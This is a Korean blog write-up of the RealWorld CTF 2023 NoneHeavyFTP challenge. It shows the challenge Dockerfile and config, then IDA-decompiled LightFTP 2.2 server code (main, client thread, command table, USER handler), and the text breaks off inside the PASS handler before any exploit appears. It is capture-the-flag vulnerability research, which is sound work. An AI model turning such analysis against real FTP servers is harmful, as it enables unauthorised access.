<!DOCTYPE html>
<html lang="en" dir="auto">

<head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>RealWorld CTF 2023 - NoneHeavyFTP | msh1307</title>
<meta name="keywords" content="RealWorld CTF 2023, RealWorld CTF NoneheavyFTP">
<meta name="description" content="NonHeavyFTP 난이도가 Baby인거 보고 달려들었는데, 어려웠다.
Analysis [ftpconfig] port=2121 maxusers=10000000 interface=0.0.0.0 local_mask=255.255.255.255 minport=30000 maxport=60000 goodbyemsg=Goodbye! keepalive=1 [anonymous] pswd=* accs=readonly root=/server/data/ ftp 서비스의 config 파일이다.
FROM ubuntu:22.04 ENV DEBIAN_FRONTEND noninteractive RUN apt-get update &amp;&amp;\ apt-get install -y --no-install-recommends wget unzip gcc make libc6-dev gnutls-dev uuid RUN mkdir -p /server/data/ &amp;&amp;\ echo &#34;hello from LightFTP&#34; &gt;&gt; /server/data/hello.txt &amp;&amp;\ cd /server &amp;&amp;\ wget --no-check-certificate https://codeload.github.com/hfiref0x/LightFTP/zip/refs/tags/v2.2 -O LightFTP-2.2.zip &amp;&amp;\ unzip LightFTP-2.2.zip &amp;&amp;\ cd LightFTP-2.2/Source/Release &amp;&amp;\ make &amp;&amp;\ cp -a .">
<meta name="author" content="">
<link rel="canonical" href="https://msh1307.kr/blog/realworld_ctf_2023_noneheavyftp/">
<link crossorigin="anonymous" href="/assets/css/stylesheet.min.d9c43e0c7cae3b38c51e79921ad3cf2685d9811a56593a817d9b57ac4fdebf2b.css" integrity="sha256-2cQ&#43;DHyuOzjFHnmSGtPPJoXZgRpWWTqBfZtXrE/evys=" rel="preload stylesheet" as="style">
<script defer crossorigin="anonymous" src="/assets/js/highlight.min.b95bacdc39e37a332a9f883b1e78be4abc1fdca2bc1f2641f55e3cd3dabd4d61.js" integrity="sha256-uVus3DnjejMqn4g7Hni&#43;Srwf3KK8HyZB9V4809q9TWE="
    onload="hljs.initHighlightingOnLoad();"></script>
<script async src="https://www.googletagmanager.com/gtag/js?id=G-BR89V2WEC0"></script>
<script>
window.dataLayer = window.dataLayer || [];
function gtag(){dataLayer.push(arguments);}
gtag('js', new Date());
gtag('config', 'G-BR89V2WEC0');
</script>
<link rel="icon" href="https://msh1307.kr/favicon.ico">
<link rel="icon" type="image/png" sizes="16x16" href="https://msh1307.kr/favicon-16x16.png">
<link rel="icon" type="image/png" sizes="32x32" href="https://msh1307.kr/favicon-32x32.png">
<link rel="apple-touch-icon" href="https://msh1307.kr/apple-touch-icon.png">
<link rel="mask-icon" href="https://msh1307.kr/safari-pinned-tab.svg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
    <style>
        @media (prefers-color-scheme: dark) {
            :root {
                --theme: rgb(29, 30, 32);
                --entry: rgb(46, 46, 51);
                --primary: rgb(218, 218, 219);
                --secondary: rgb(155, 156, 157);
                --tertiary: rgb(65, 66, 68);
                --content: rgb(196, 196, 197);
                --hljs-bg: rgb(46, 46, 51);
                --code-bg: rgb(55, 56, 62);
                --border: rgb(51, 51, 51);
            }

            .list {
                background: var(--theme);
            }

            .list:not(.dark)::-webkit-scrollbar-track {
                background: 0 0;
            }

            .list:not(.dark)::-webkit-scrollbar-thumb {
                border-color: var(--theme);
            }
        }

    </style>
</noscript><meta property="og:title" content="RealWorld CTF 2023 - NoneHeavyFTP" />
<meta property="og:description" content="NonHeavyFTP 난이도가 Baby인거 보고 달려들었는데, 어려웠다.
Analysis [ftpconfig] port=2121 maxusers=10000000 interface=0.0.0.0 local_mask=255.255.255.255 minport=30000 maxport=60000 goodbyemsg=Goodbye! keepalive=1 [anonymous] pswd=* accs=readonly root=/server/data/ ftp 서비스의 config 파일이다.
FROM ubuntu:22.04 ENV DEBIAN_FRONTEND noninteractive RUN apt-get update &amp;&amp;\ apt-get install -y --no-install-recommends wget unzip gcc make libc6-dev gnutls-dev uuid RUN mkdir -p /server/data/ &amp;&amp;\ echo &#34;hello from LightFTP&#34; &gt;&gt; /server/data/hello.txt &amp;&amp;\ cd /server &amp;&amp;\ wget --no-check-certificate https://codeload.github.com/hfiref0x/LightFTP/zip/refs/tags/v2.2 -O LightFTP-2.2.zip &amp;&amp;\ unzip LightFTP-2.2.zip &amp;&amp;\ cd LightFTP-2.2/Source/Release &amp;&amp;\ make &amp;&amp;\ cp -a ." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://msh1307.kr/blog/realworld_ctf_2023_noneheavyftp/" /><meta property="article:section" content="blog" />
<meta property="article:published_time" content="2023-01-07T00:00:00&#43;00:00" />
<meta property="article:modified_time" content="2023-01-07T00:00:00&#43;00:00" />

<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="RealWorld CTF 2023 - NoneHeavyFTP"/>
<meta name="twitter:description" content="NonHeavyFTP 난이도가 Baby인거 보고 달려들었는데, 어려웠다.
Analysis [ftpconfig] port=2121 maxusers=10000000 interface=0.0.0.0 local_mask=255.255.255.255 minport=30000 maxport=60000 goodbyemsg=Goodbye! keepalive=1 [anonymous] pswd=* accs=readonly root=/server/data/ ftp 서비스의 config 파일이다.
FROM ubuntu:22.04 ENV DEBIAN_FRONTEND noninteractive RUN apt-get update &amp;&amp;\ apt-get install -y --no-install-recommends wget unzip gcc make libc6-dev gnutls-dev uuid RUN mkdir -p /server/data/ &amp;&amp;\ echo &#34;hello from LightFTP&#34; &gt;&gt; /server/data/hello.txt &amp;&amp;\ cd /server &amp;&amp;\ wget --no-check-certificate https://codeload.github.com/hfiref0x/LightFTP/zip/refs/tags/v2.2 -O LightFTP-2.2.zip &amp;&amp;\ unzip LightFTP-2.2.zip &amp;&amp;\ cd LightFTP-2.2/Source/Release &amp;&amp;\ make &amp;&amp;\ cp -a ."/>


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "Blogs",
      "item": "https://msh1307.kr/blog/"
    }, 
    {
      "@type": "ListItem",
      "position":  3 ,
      "name": "RealWorld CTF 2023 - NoneHeavyFTP",
      "item": "https://msh1307.kr/blog/realworld_ctf_2023_noneheavyftp/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "RealWorld CTF 2023 - NoneHeavyFTP",
  "name": "RealWorld CTF 2023 - NoneHeavyFTP",
  "description": "NonHeavyFTP 난이도가 Baby인거 보고 달려들었는데, 어려웠다.\nAnalysis [ftpconfig] port=2121 maxusers=10000000 interface=0.0.0.0 local_mask=255.255.255.255 minport=30000 maxport=60000 goodbyemsg=Goodbye! keepalive=1 [anonymous] pswd=* accs=readonly root=/server/data/ ftp 서비스의 config 파일이다.\nFROM ubuntu:22.04 ENV DEBIAN_FRONTEND noninteractive RUN apt-get update \u0026amp;\u0026amp;\\ apt-get install -y --no-install-recommends wget unzip gcc make libc6-dev gnutls-dev uuid RUN mkdir -p /server/data/ \u0026amp;\u0026amp;\\ echo \u0026#34;hello from LightFTP\u0026#34; \u0026gt;\u0026gt; /server/data/hello.txt \u0026amp;\u0026amp;\\ cd /server \u0026amp;\u0026amp;\\ wget --no-check-certificate https://codeload.github.com/hfiref0x/LightFTP/zip/refs/tags/v2.2 -O LightFTP-2.2.zip \u0026amp;\u0026amp;\\ unzip LightFTP-2.2.zip \u0026amp;\u0026amp;\\ cd LightFTP-2.2/Source/Release \u0026amp;\u0026amp;\\ make \u0026amp;\u0026amp;\\ cp -a .",
  "keywords": [
    "RealWorld CTF 2023", "RealWorld CTF NoneheavyFTP"
  ],
  "articleBody": "NonHeavyFTP 난이도가 Baby인거 보고 달려들었는데, 어려웠다.\nAnalysis [ftpconfig] port=2121 maxusers=10000000 interface=0.0.0.0 local_mask=255.255.255.255 minport=30000 maxport=60000 goodbyemsg=Goodbye! keepalive=1 [anonymous] pswd=* accs=readonly root=/server/data/ ftp 서비스의 config 파일이다.\nFROM ubuntu:22.04 ENV DEBIAN_FRONTEND noninteractive RUN apt-get update \u0026\u0026\\ apt-get install -y --no-install-recommends wget unzip gcc make libc6-dev gnutls-dev uuid RUN mkdir -p /server/data/ \u0026\u0026\\ echo \"hello from LightFTP\" \u003e\u003e /server/data/hello.txt \u0026\u0026\\ cd /server \u0026\u0026\\ wget --no-check-certificate https://codeload.github.com/hfiref0x/LightFTP/zip/refs/tags/v2.2 -O LightFTP-2.2.zip \u0026\u0026\\ unzip LightFTP-2.2.zip \u0026\u0026\\ cd LightFTP-2.2/Source/Release \u0026\u0026\\ make \u0026\u0026\\ cp -a ./fftp /server/ \u0026\u0026\\ cd /server \u0026\u0026\\ rm -rf LightFTP-2.2 LightFTP-2.2.zip COPY ./flag /flag COPY ./fftp.conf /server/fftp.conf RUN mv /flag /flag.`uuid` \u0026\u0026\\ useradd -M -d /server/ -U ftp WORKDIR /server EXPOSE 2121 CMD [\"runuser\", \"-u\", \"ftp\", \"-g\", \"ftp\", \"/server/fftp\", \"/server/fftp.conf\"] /flag 이름을 uuid를 통해서 랜덤하게 바꿔주고 있다. flag 파일의 이름을 알아내야할 필요가 있다.\nhttps://github.com/hfiref0x/LightFTP 그리고 깃헙을 뒤져보니 실제로 LightFTP가 있었다. 탈주뛸 준비를 하다가 발견해서 소스코드를 다운받고 분석했다.\n소스코드 디렉토리가 난잡해보여서 그냥 아이다로 까고 모르겠으면 소스코드를 봤다.\nint __cdecl __noreturn main(int argc, const char **argv, const char **envp) { char *v4; // rbp __int64 v5; // rax char *v6; // r12 int v7; // edi char *v8; // rax char *v9; // rax char *v10; // rax int v11; // ebx pthread_t v12[7]; // [rsp+0h] [rbp-38h] BYREF v12[1] = __readfsqword(0x28u); if ( argc \u003c= 1 ) v4 = (char *)config_init(\"fftp.conf\", argv, envp); else v4 = (char *)config_init(argv[1], argv, envp); if ( !v4 ) { __printf_chk(1LL, \"Could not find configuration file\\r\\n\\r\\n Usage: fftp [CONFIGFILE]\\r\\n\\r\\n\"); if ( g_log != -1 ) close(g_log); LABEL_31: ftp_tls_cleanup(); exit(2); } v5 = x_malloc(\u0026_data_start); g_cfg = (__int64)v4; v6 = (char *)v5; in.s_addr = inet_addr(\"127.0.0.1\"); if ( (unsigned int)config_parse(v4, \"ftpconfig\", \"interface\", v6, (__int64)\u0026_data_start) ) in.s_addr = inet_addr(v6); stru_1011C.s_addr = inet_addr(\"0.0.0.0\"); if ( (unsigned int)config_parse(v4, \"ftpconfig\", \"external_ip\", v6, (__int64)\u0026_data_start) ) stru_1011C.s_addr = inet_addr(v6); stru_10120.s_addr = inet_addr(\"255.255.255.0\"); if ( (unsigned int)config_parse(v4, \"ftpconfig\", \"local_mask\", v6, (__int64)\u0026_data_start) ) stru_10120.s_addr = inet_addr(v6); word_10110 = 21; if ( (unsigned int)config_parse(v4, \"ftpconfig\", \"port\", v6, (__int64)\u0026_data_start) ) word_10110 = strtoul(v6, 0LL, 10); dword_10108 = 1; if ( (unsigned int)config_parse(v4, \"ftpconfig\", \"maxusers\", v6, (__int64)\u0026_data_start) ) dword_10108 = strtoul(v6, 0LL, 10); dword_1010C = 0; if ( (unsigned int)config_parse(v4, \"ftpconfig\", \"keepalive\", v6, (__int64)\u0026_data_start) ) dword_1010C = strtoul(v6, 0LL, 10); word_10112 = 1024; if ( (unsigned int)config_parse(v4, \"ftpconfig\", \"minport\", v6, (__int64)\u0026_data_start) ) word_10112 = strtoul(v6, 0LL, 10); word_10114 = -1; if ( (unsigned int)config_parse(v4, \"ftpconfig\", \"maxport\", v6, (__int64)\u0026_data_start) ) word_10114 = strtoul(v6, 0LL, 10); config_parse(v4, \"ftpconfig\", \"CATrustFile\", CAFILE, 4096LL); config_parse(v4, \"ftpconfig\", \"ServerCertificate\", CERTFILE, 4096LL); config_parse(v4, \"ftpconfig\", \"Keyfile\", KEYFILE, 4096LL); config_parse(v4, \"ftpconfig\", \"KeyfilePassword\", KEYFILE_PASS, 256LL); config_parse(v4, \"ftpconfig\", \"goodbyemsg\", GOODBYE_MSG, 128LL); memset(v6, 0, (size_t)\u0026_data_start); if ( (unsigned int)config_parse(v4, \"ftpconfig\", \"logfilepath\", v6, (__int64)\u0026_data_start) ) { g_log = open64(v6, 66, 384LL); v7 = g_log; if ( g_log == -1 ) { __printf_chk(1LL, \"Error: Failed to open/create log file. Please check logfilepath: %s\\r\\n\", v6); __printf_chk( 1LL, \"Possible errors: 1) path is invalid; 2) file is read only; 3) file is directory; 4) insufficient permissions\\r\\n\"); LABEL_28: free(v4); if ( g_log != -1 ) close(g_log); free(v6); goto LABEL_31; } } else { __printf_chk(1LL, \"WARNING: logfilepath section is not found in configuration. Logging to file disabled.\\r\\n\"); v7 = g_log; if ( g_log == -1 ) { LABEL_22: __printf_chk(1LL, \"\\r\\n [ LightFTP server v%s ]\\r\\n\\r\\n\", \"2.2\"); __printf_chk(1LL, \"Log file : %s\\r\\n\", v6); if ( getcwd(v6, (size_t)\u0026_data_start) ) __printf_chk(1LL, \"Working dir : %s\\r\\n\", v6); if ( argc \u003c= 1 ) __printf_chk(1LL, \"Config file : %s/%s\\r\\n\", v6, \"fftp.conf\"); else __printf_chk(1LL, \"Config file : %s\\r\\n\", argv[1]); v8 = inet_ntoa(in); __printf_chk(1LL, \"Interface ipv4 : %s\\r\\n\", v8); v9 = inet_ntoa(stru_10120); __printf_chk(1LL, \"Interface mask : %s\\r\\n\", v9); v10 = inet_ntoa(stru_1011C); __printf_chk(1LL, \"External ipv4 : %s\\r\\n\", v10); __printf_chk(1LL, \"Port : %u\\r\\n\", (unsigned __int16)word_10110); __printf_chk(1LL, \"Max users : %u\\r\\n\", (unsigned int)dword_10108); __printf_chk(1LL, \"PASV port range : %u..%u\\r\\n\", (unsigned __int16)word_10112, (unsigned __int16)word_10114); __printf_chk(1LL, \"\\r\\n TYPE q or Ctrl+C to terminate \u003e\\r\\n\"); ftp_tls_init(); v12[0] = 0LL; if ( pthread_create(v12, 0LL, ftpmain, 0LL) ) { __printf_chk(1LL, \"Error: Failed to create main server thread\\r\\n\"); } else { do { v11 = getc(stdin); sleep(1u); } while ( (v11 \u0026 0xFFFFFFDF) != 'Q' ); } goto LABEL_28; } } lseek64(v7, 0LL, 2); goto LABEL_22; } 그냥 서버에서 화면? status? 띄워주는 함수다. 클라이언트랑은 상관없으니까 패스하고, ftpmain 함수부터 보면된다.\nvoid *__fastcall ftpmain(void *a1) { int v1; // eax int v2; // r12d _DWORD *v3; // rbp unsigned int v4; // eax __int64 v5; // rdx int v6; // r15d int *v7; // r14 int optval; // [rsp+10h] [rbp-68h] BYREF socklen_t addr_len; // [rsp+14h] [rbp-64h] BYREF pthread_t v11; // [rsp+18h] [rbp-60h] BYREF struct sockaddr addr; // [rsp+20h] [rbp-58h] BYREF unsigned __int64 v13; // [rsp+38h] [rbp-40h] v13 = __readfsqword(0x28u); v1 = socket(2, 1, 6); if ( v1 == -1 ) { __printf_chk(1LL, \"\\r\\n socket create error\\r\\n\"); } else { v2 = v1; optval = 1; setsockopt(v1, 1, 2, \u0026optval, 4u); v3 = (_DWORD *)x_malloc(4LL * (unsigned int)dword_10108); if ( dword_10108 ) { v4 = 0; do { v5 = v4++; v3[v5] = -1; } while ( dword_10108 \u003e v4 ); } addr.sa_family = 2; *(_QWORD *)\u0026addr.sa_data[6] = 0LL; *(_WORD *)addr.sa_data = __ROL2__(word_10110, 8); *(struct in_addr *)\u0026addr.sa_data[2] = in; if ( bind(v2, \u0026addr, 0x10u) ) { __printf_chk(1LL, \"\\r\\n Failed to start server. Can not bind to address\\r\\n\\r\\n\"); free(v3); close(v2); } else { writelogentry(0LL, \"220 LightFTP server ready\\r\\n\", \"\"); if ( !listen(v2, 4096) ) { while ( 1 ) { while ( 1 ) { do { addr_len = 16; addr = 0LL; v6 = accept(v2, \u0026addr, \u0026addr_len); } while ( v6 == -1 ); optval = -1; if ( !dword_10108 ) break; v7 = v3; while ( *v7 != -1 ) { if ( ++v7 == \u0026v3[dword_10108] ) goto LABEL_16; } if ( dword_1010C ) socket_set_keepalive(v6); *v7 = v6; optval = pthread_create(\u0026v11, 0LL, ftp_client_thread, v7); if ( optval ) { *v7 = -1; if ( optval ) break; } } LABEL_16: send(v6, \"MAXIMUM ALLOWED USERS CONNECTED\\r\\n\", 0x21uLL, 0x4000); close(v6); } } free(v3); close(v2); } } return 0LL; } 마찬가지로 ftp_client_thread만 보면된다.\n// positive sp value has been detected, the output may be wrong! void *__fastcall ftp_client_thread(int *a1) { int v1; // edi __int64 v2; // rbp unsigned __int8 v4; // bl const unsigned __int16 **v5; // rax __int64 v6; // rdx const char *v7; // rbp __int64 v8; // rax size_t v9; // r13 char *v10; // rax char *v11; // rdx const char **v12; // r12 int v13; // ebx int v14; // ebp float v15; // xmm1_4 double v16; // xmm1_8 float v17; // xmm0_4 int *v18; // [rsp-100h] [rbp-6130h] char *v19; // [rsp-F8h] [rbp-6128h] pthread_mutexattr_t *v20; // [rsp-F0h] [rbp-6120h] socklen_t v21; // [rsp-DCh] [rbp-610Ch] BYREF void *v22; // [rsp-D8h] [rbp-6108h] BYREF pthread_mutexattr_t v23; // [rsp-CCh] [rbp-60FCh] BYREF struct sockaddr v24; // [rsp-C8h] [rbp-60F8h] BYREF pthread_mutex_t mutex; // [rsp-B8h] [rbp-60E8h] BYREF int v26; // [rsp-90h] [rbp-60C0h] int v27; // [rsp-8Ch] [rbp-60BCh] pthread_t v28; // [rsp-88h] [rbp-60B8h] __int64 v29; // [rsp-80h] [rbp-60B0h] int v30; // [rsp-78h] [rbp-60A8h] int v31; // [rsp-74h] [rbp-60A4h] int v32; // [rsp-70h] [rbp-60A0h] __int16 v33; // [rsp-6Ch] [rbp-609Ch] int v34; // [rsp-68h] [rbp-6098h] int v35; // [rsp-64h] [rbp-6094h] unsigned __int32 v36; // [rsp-5Ch] [rbp-608Ch] char v37; // [rsp-40h] [rbp-6070h] char v38; // [rsp+0h] [rbp-6030h] BYREF __int64 v39; // [rsp+1000h] [rbp-5030h] BYREF __int64 v40; // [rsp+4FC0h] [rbp-1070h] __int64 v41; // [rsp+4FC8h] [rbp-1068h] __int64 v42; // [rsp+4FD0h] [rbp-1060h] size_t v43; // [rsp+4FD8h] [rbp-1058h] size_t v44; // [rsp+4FE0h] [rbp-1050h] __int64 instr_recved[521]; // [rsp+4FE8h] [rbp-1048h] BYREF while ( \u0026v38 != (char *)(\u0026v39 - 3072) ) ; v18 = a1; instr_recved[513] = __readfsqword(0x28u); memset(\u0026mutex, 0, 0x50A0uLL); v1 = *a1; v21 = 16; v26 = v1; v24 = 0LL; if ( !getsockname(v1, \u0026v24, \u0026v21) ) { v21 = 16; v30 = *(_DWORD *)\u0026v24.sa_data[2]; v24 = 0LL; if ( !getpeername(v26, \u0026v24, \u0026v21) ) { v35 = 0; v31 = *(_DWORD *)\u0026v24.sa_data[2]; v29 = 0xFFFFFFFFLL; v27 = -1; v36 = _InterlockedIncrement(\u0026g_newid); v34 = -1; pthread_mutexattr_init(\u0026v23); pthread_mutexattr_settype(\u0026v23, 1); pthread_mutex_init(\u0026mutex, \u0026v23); v37 = 47; if ( v40 ) ((void (__fastcall *)(__int64, const char *, __int64))gnutls_record_send)( v40, \"220 LightFTP server ready\\r\\n\", 27LL); else send(v26, \"220 LightFTP server ready\\r\\n\", 0x1BuLL, 0x4000); memset(instr_recved, 0, 0x1000uLL); ((void (__fastcall *)(__int64 *, __int64, __int64, __int64, const char *, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD))__snprintf_chk)( instr_recved, 4096LL, 1LL, 4096LL, \"\u003c- New user IP=%u.%u.%u.%u:%u\", (unsigned __int8)v24.sa_data[2], (unsigned __int8)v24.sa_data[3], (unsigned __int8)v24.sa_data[4], HIBYTE(*(_DWORD *)\u0026v24.sa_data[2]), (unsigned __int16)__ROL2__(*(_WORD *)v24.sa_data, 8)); writelogentry((__int64)\u0026mutex, (__int64)instr_recved, (__int64)\"\"); do { LABEL_10: if ( v26 == -1 || !(unsigned int)recvcmd_part_0((__int64)\u0026mutex, (char *)instr_recved, 0x1000LL) )// recvuntil \\r\\n break; v4 = instr_recved[0]; if ( LOBYTE(instr_recved[0]) ) { v5 = __ctype_b_loc(); v6 = 0LL; while ( ((*v5)[(char)v4] \u0026 0x400) == 0 ) { ++v6; v4 = *((_BYTE *)instr_recved + v6); if ( !v4 ) { v7 = (char *)instr_recved + v6; goto LABEL_41; } } v7 = (char *)instr_recved + v6; v8 = v6; if ( (v4 \u0026 0xDF) != 0 ) { do { ++v8; v4 = *((_BYTE *)instr_recved + v8); } while ( (v4 \u0026 0xDF) != 0 ); v9 = v8 - v6; } else { v9 = 0LL; } while ( v4 == ' ' ) { ++v8; v4 = *((_BYTE *)instr_recved + v8); } v10 = (char *)instr_recved + v8; // Second Arg? v11 = 0LL; if ( v4 ) v11 = v10; v19 = v11; } else { v7 = (const char *)instr_recved; LABEL_41: v19 = 0LL; v9 = 0LL; } v12 = (const char **)\u0026ftpprocs; v13 = 0; while ( strncasecmp(v7, *v12, v9) ) // instruction parsing { ++v13; v12 += 2; if ( v13 == 0x20 ) // instruction cnts -\u003e 32 { writelogentry((__int64)\u0026mutex, (__int64)\" @@ CMD: \", (__int64)instr_recved); if ( v40 ) ((void (__fastcall *)(__int64, const char *, __int64))gnutls_record_send)( v40, \"500 Syntax error, command unrecognized.\\r\\n\", 41LL); else send(v26, \"500 Syntax error, command unrecognized.\\r\\n\", 0x29uLL, 0x4000); goto LABEL_10; } } v14 = ((__int64 (__fastcall *)(pthread_mutex_t *, char *))(\u0026ftpprocs)[2 * v13 + 1])(\u0026mutex, v19);// CALL FTP USR if ( v13 == 0xD ) writelogentry((__int64)\u0026mutex, (__int64)\" @@ CMD: \", (__int64)\"PASS ***\"); else writelogentry((__int64)\u0026mutex, (__int64)\" @@ CMD: \", (__int64)instr_recved); } while ( v14 \u003e 0 ); v22 = 0LL; if ( !(_DWORD)v29 ) { HIDWORD(v29) = 1; sleep(2u); if ( pthread_join(v28, \u0026v22) ) { writelogentry((__int64)\u0026mutex, (__int64)\"Enter cancel\", (__int64)\"\"); pthread_cancel(v28); } LODWORD(v29) = -1; } if ( v27 != -1 ) { close(v27); v27 = -1; } if ( v34 != -1 ) { close(v34); v34 = -1; } v32 = 0; v33 = 0; pthread_mutex_destroy(\u0026mutex); pthread_mutexattr_destroy(v20); if ( v42 \u003c 0 ) v15 = (float)(v42 \u0026 1 | (unsigned int)((unsigned __int64)v42 \u003e\u003e 1)) + (float)(v42 \u0026 1 | (unsigned int)((unsigned __int64)v42 \u003e\u003e 1)); else v15 = (float)(int)v42; v16 = (float)(v15 * 0.00000095367432); if ( v41 \u003c 0 ) v17 = (float)(v41 \u0026 1 | (unsigned int)((unsigned __int64)v41 \u003e\u003e 1)) + (float)(v41 \u0026 1 | (unsigned int)((unsigned __int64)v41 \u003e\u003e 1)); else v17 = (float)(int)v41; ((void (*)(__int64 *, __int64, __int64, __int64, const char *, ...))__snprintf_chk)( instr_recved, 4096LL, 1LL, 4096LL, \" User disconnected. \\n\" \"==== Session %u statistics ====\\n\" \"Rx: %zd bytes (%f MBytes) total received by server in %zd files,\\n\" \"Tx: %zd bytes (%f MBytes) total sent to the client in %zd files.\\n\", v36, v41, (float)(v17 * 0.00000095367432), v43, v42, v16, v44); writelogentry((__int64)\u0026mutex, (__int64)instr_recved, (__int64)\"\"); } } v2 = v40; if ( v40 ) { ((void (__fastcall *)(__int64, _QWORD))gnutls_bye)(v40, 0LL); ((void (__fastcall *)(__int64))gnutls_deinit)(v2); } close(v26); *v18 = -1; return 0LL; } recvcmd_part_0 함수는 \\r\\n으로 끝나는 명령어가 오면, instruction operand로 잘 분리해서 저장해주고, 함수를 호출한다.\n.data.rel.ro:000000000000F8E0 ftpprocs dq offset aUser_0 ; DATA XREF: ftp_client_thread:loc_9A3E↑o .data.rel.ro:000000000000F8E0 ; ftp_client_thread+326↑o .data.rel.ro:000000000000F8E0 ; \"USER\" .data.rel.ro:000000000000F8E8 dq offset ftpUSER .data.rel.ro:000000000000F8F0 dq offset aQuit+1 ; \"QUIT\" .data.rel.ro:000000000000F8F8 dq offset ftpQUIT .data.rel.ro:000000000000F900 dq offset aNoop ; \"NOOP\" .data.rel.ro:000000000000F908 dq offset ftpNOOP .data.rel.ro:000000000000F910 dq offset aPwd ; \"PWD\" .data.rel.ro:000000000000F918 dq offset ftpPWD .data.rel.ro:000000000000F920 dq offset aType ; \"TYPE\" .data.rel.ro:000000000000F928 dq offset ftpTYPE .data.rel.ro:000000000000F930 dq offset aPort_0 ; \"PORT\" .data.rel.ro:000000000000F938 dq offset ftpPORT .data.rel.ro:000000000000F940 dq offset aList+1 ; \"LIST\" .data.rel.ro:000000000000F948 dq offset ftpLIST .data.rel.ro:000000000000F950 dq offset aCdup+1 ; \"CDUP\" .data.rel.ro:000000000000F958 dq offset ftpCDUP .data.rel.ro:000000000000F960 dq offset aCwd_0 ; \"CWD\" .data.rel.ro:000000000000F968 dq offset ftpCWD .data.rel.ro:000000000000F970 dq offset aRetr_0 ; \"RETR\" .data.rel.ro:000000000000F978 dq offset ftpRETR .data.rel.ro:000000000000F980 dq offset aAbor ; \"ABOR\" .data.rel.ro:000000000000F988 dq offset ftpABOR .data.rel.ro:000000000000F990 dq offset aDele_0 ; \"DELE\" .data.rel.ro:000000000000F998 dq offset ftpDELE .data.rel.ro:000000000000F9A0 dq offset aPasv ; \"PASV\" .data.rel.ro:000000000000F9A8 dq offset ftpPASV .data.rel.ro:000000000000F9B0 dq offset aPass_0 ; \"PASS\" .data.rel.ro:000000000000F9B8 dq offset ftpPASS .data.rel.ro:000000000000F9C0 dq offset aRest ; \"REST\" .data.rel.ro:000000000000F9C8 dq offset ftpREST .data.rel.ro:000000000000F9D0 dq offset aSize_0 ; \"SIZE\" .data.rel.ro:000000000000F9D8 dq offset ftpSIZE .data.rel.ro:000000000000F9E0 dq offset aMkd_0 ; \"MKD\" .data.rel.ro:000000000000F9E8 dq offset ftpMKD .data.rel.ro:000000000000F9F0 dq offset aRmd ; \"RMD\" .data.rel.ro:000000000000F9F8 dq offset ftpRMD .data.rel.ro:000000000000FA00 dq offset aStor_0 ; \"STOR\" .data.rel.ro:000000000000FA08 dq offset ftpSTOR .data.rel.ro:000000000000FA10 dq offset aSyst ; \"SYST\" .data.rel.ro:000000000000FA18 dq offset ftpSYST .data.rel.ro:000000000000FA20 dq offset aFeat ; \"FEAT\" .data.rel.ro:000000000000FA28 dq offset ftpFEAT .data.rel.ro:000000000000FA30 dq offset aAppe_0 ; \"APPE\" .data.rel.ro:000000000000FA38 dq offset ftpAPPE .data.rel.ro:000000000000FA40 dq offset aRnfr_0 ; \"RNFR\" .data.rel.ro:000000000000FA48 dq offset ftpRNFR .data.rel.ro:000000000000FA50 dq offset aRnto_0 ; \"RNTO\" .data.rel.ro:000000000000FA58 dq offset ftpRNTO .data.rel.ro:000000000000FA60 dq offset aOpts ; \"OPTS\" .data.rel.ro:000000000000FA68 dq offset ftpOPTS .data.rel.ro:000000000000FA70 dq offset aMlsd ; \"MLSD\" .data.rel.ro:000000000000FA78 dq offset ftpMLSD .data.rel.ro:000000000000FA80 dq offset aAuth ; \"AUTH\" .data.rel.ro:000000000000FA88 dq offset ftpAUTH .data.rel.ro:000000000000FA90 dq offset aPbsz ; \"PBSZ\" .data.rel.ro:000000000000FA98 dq offset ftpPBSZ .data.rel.ro:000000000000FAA0 dq offset aProt ; \"PROT\" .data.rel.ro:000000000000FAA8 dq offset ftpPROT .data.rel.ro:000000000000FAB0 dq offset aEpsv ; \"EPSV\" .data.rel.ro:000000000000FAB8 dq offset ftpEPSV .data.rel.ro:000000000000FAC0 dq offset aHelp_0 ; \"HELP\" .data.rel.ro:000000000000FAC8 dq offset ftpHELP .data.rel.ro:000000000000FAD0 dq offset aSite ; \"SITE\" .data.rel.ro:000000000000FAD8 dq offset ftpSITE .data.rel.ro:000000000000FAD8 _data_rel_ro ends .data.rel.ro:000000000000FAD8 이런식으로 string과 함수 주소가 잘 매칭되어있다.\n_BOOL8 __fastcall ftpUSER(char *mutex, char *user_name) { size_t v2; // rdx if ( user_name ) { *((_DWORD *)mutex + 22) = 0; writelogentry((__int64)mutex, (__int64)\" USER: \", (__int64)user_name); __snprintf_chk((__int64)(mutex + 0x3078), 0x2000LL, 1LL, 0x2000LL, \"331 User %s OK. Password required\\r\\n\"); v2 = strlen(mutex + 0x3078); // make string if ( *((_QWORD *)mutex + 0xA0F) ) gnutls_record_send(); else send(*((_DWORD *)mutex + 10), mutex + 0x3078, v2, 0x4000); __strcpy_chk(mutex + 0x3078, user_name, 0x2000uLL); return 1LL; } else if ( *((_QWORD *)mutex + 0xA0F) ) { return gnutls_record_send() \u003e= 0; } else { return send(*((_DWORD *)mutex + 10), \"501 Syntax error in parameters or arguments.\\r\\n\", 0x2EuLL, 0x4000) \u003e= 0; } } ftpUSER 함수는 유저 이름 받는 함수이다. 이때 config_parse를 통해서 config 파일에서 그 유저에 대한 접근 권한, root path에 대한 정보를 받아온다. 그 이후 PASS로 비밀번호 인증하라고 한다.\n_BOOL8 __fastcall ftpPASS(__int64 a1, const char *password) { int v2; // eax int v3; // r8d char v5[264]; // [rsp+0h] [rbp-138h] BYREF unsigned __int64 v6; // [rsp+108h] [rbp-30h] v6 = __readfsqword(0x28u); if ( !password ) { if ( *(_QWORD *)(a1 + 0x5078) ) return gnutls_record_send() \u003e= 0; else return send(*(_DWORD *)(a1 + 40), \"501 Syntax error in parameters or 